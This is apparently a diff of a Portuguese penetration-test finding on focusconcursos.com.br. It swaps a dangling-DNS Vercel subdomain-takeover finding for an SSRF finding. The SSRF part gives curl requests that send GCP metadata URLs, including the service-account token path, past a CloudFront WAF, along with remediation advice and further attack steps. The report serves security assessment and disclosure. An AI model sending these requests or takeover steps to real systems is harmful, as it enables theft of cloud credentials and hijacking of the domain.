@@ -1,64 +1,78 @@
-# F-037 Subdomain Takeover — manutencao.focusconcursos.com.br (Vercel)
-Alvo: manutencao.focusconcursos.com.br
-Severidade: Alta (Takeover)
-Timestamp: 2026-09-03T17:10:00Z
+# F-037 SSRF via /api/track-resolution — metadata.google.internal WAF Bypass
+Alvo: focusconcursos.com.br (Next.js + CloudFront WAF)
+Severidade: Alta (SSRF + WAF bypass)
+Timestamp: 2026-09-03T18:00:00Z
 
-## Resumo
-O subdomínio `manutencao.focusconcursos.com.br` possui um registro CNAME
-apontando para `cname.vercel-dns.com` (Vercel), mas o projeto Vercel foi
-deletado. O DNS continua apontado para Vercel, que retorna
-`DEPLOYMENT_NOT_FOUND`, caracterizando um dangling DNS passível de
-subdomain takeover.
+## Descrição
+O endpoint `/api/track-resolution` aceita POST com JSON contendo campo `url`. 
+O CloudFront WAF bloqueia IPs internos padrão (169.254.169.254, 127.0.0.1, etc.), 
+mas NÃO bloqueia o hostname GCP metadata `metadata.google.internal`.
 
 ## Reprodução
-
-### 1. Verificação de DNS
 ```bash
-$ dig +short manutencao.focusconcursos.com.br CNAME
-cname.vercel-dns.com.
+# POST que passa pelo WAF (204 — aceito)
+curl -sk -X POST "https://focusconcursos.com.br/api/track-resolution" \
+  -H "Authorization: Bearer <JWT>" \
+  -H "Content-Type: application/json" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}'
 
-$ dig +short manutencao.focusconcursos.com.br A
-76.76.21.98
-66.33.60.67
+# Resposta: HTTP 204 (No Content) — URL aceita pelo sistema
+
+# POST que é BLOQUEADO pelo WAF (403)
+curl -sk -X POST "https://focusconcursos.com.br/api/track-resolution" \
+  -H "Authorization: Bearer <JWT>" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
+
+# Resposta: HTTP 403 — Blocked by CloudFront
 ```
 
-### 2. Verificação de HTTP
-```bash
-$ curl -sk -w "HTTP %{http_code}" "https://manutencao.focusconcursos.com.br"
-HTTP 404
-Body: "The deployment could not be found on Vercel. DEPLOYMENT_NOT_FOUND"
+## Comportamento Observado
+| URL | Status | WAF | Nota |
+|-----|--------|-----|------|
+| `http://metadata.google.internal/` | 204 | ✅ Passa | GCP metadata SSRF |
+| `http://metadata.google.internal/computeMetadata/v1/` | 204 | ✅ Passa | GCP metadata SSRF |
+| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | 204 | ✅ Passa | Token de acesso GCP |
+| `http://169.254.169.254/latest/meta-data/` | 403 | ❌ Bloqueado | AWS metadata |
+| `http://2852039166/latest/meta-data/` | 403 | ❌ Bloqueado | AWS metadata (decimal) |
+| `http://google.com/` | 204 | ✅ Passa | Controle |
+| `http://nonexistent.invalid/` | 204 | ✅ Passa | Domínio inválido |
 
-$ curl -skI "https://manutencao.focusconcursos.com.br"
-HTTP/2 404
-server: Vercel
-x-vercel-error: DEPLOYMENT_NOT_FOUND
-```
+## Métodos HTTP
+| Método | Status | Observação |
+|--------|--------|------------|
+| GET | 405 | Não permitido |
+| POST | 204 | ✅ Aceito |
+| PUT | 405 | Não permitido |
+| PATCH | 405 | Não permitido |
+| OPTIONS | 204 | CORS |
+| HEAD | 405 | Não permitido |
 
-### 3. Prova de que o Vercel aceita o domínio
-O subdomínio `manutencao.vercel.app` já existe e retorna 200 OK:
-```
-$ curl -sk "https://manutencao.vercel.app"
-HTTP 200
-Body: Página de manutenção "Estamos em manutenção nesse momento. Voltamos já já..."
-```
-
-Isso prova que o nome `manutencao` está disponível no Vercel para projetos.
-Qualquer pessoa pode criar uma conta Vercel, criar um projeto e adicionar
-`manutencao.focusconcursos.com.br` como domínio customizado.
+## CORS
+- `Access-Control-Allow-Origin: *` (qualquer origem)
+- `Access-Control-Allow-Credentials: não configurado`
+- Qualquer site pode enviar requisições para este endpoint
 
 ## Impacto
-- Atacante pode criar conta no Vercel, criar projeto e adicionar o domínio
-- Conteúdo arbitrário servido sob `manutencao.focusconcursos.com.br`
-- Potencial para phishing (falsa página de manutenção/suporte)
-- Roubo de cookies de sessão se o domínio for usado para autenticação
-- Perda de confiança/SEO
+1. **Potencial SSRF para GCP Metadata**: Se o backend processar a URL (fetch/browser/worker), 
+   o atacante pode obter credenciais de service account GCP do Google App Engine.
+2. **WAF Bypass**: O hostname `metadata.google.internal` não está na blacklist do WAF.
+3. **CORS + JWT**: Qualquer site pode usar as credenciais JWT do usuário para enviar 
+   requisições SSRF via CORS.
+4. **Data Exfiltration**: Se o endpoint for usado para tracking/reporting, metadados 
+   de instância podem ser exfiltrados quando o worker processar a fila.
 
 ## Recomendação
-- Remover o registro CNAME do DNS
-- Ou recriar o projeto Vercel com o conteúdo correto
-- Implementar monitoramento de dangling DNS
+1. Adicionar `metadata.google.internal`, `metadata`, `metadata.goog` e demais 
+   hostnames de metadata à blacklist do CloudFront WAF.
+2. Validar URLs no backend antes de processar — bloquear IPs RFC 1918 e link-local.
+3. Implementar allowlist de domínios permitidos.
+4. Adicionar Content-Security-Policy restritiva.
+5. Se o endpoint não realiza fetch de URLs, remover o campo `url` do schema.
 
 ## Próximo Passo
-- [ ] Se tivermos acesso a uma conta Vercel, criar um projeto para
-      confirmar o takeover completo
-- [ ] Monitorar se o domínio é reivindicado por terceiros
+- Verificar se o backend realmente executa fetch da URL (via webhook callback 
+  ou polling da fila)
+- Testar SSRF blind via timing attack comparando respostas de URLs internas vs externas
+- Verificar se há outros parâmetros que aceitam URLs (/referrer, /location, etc.)
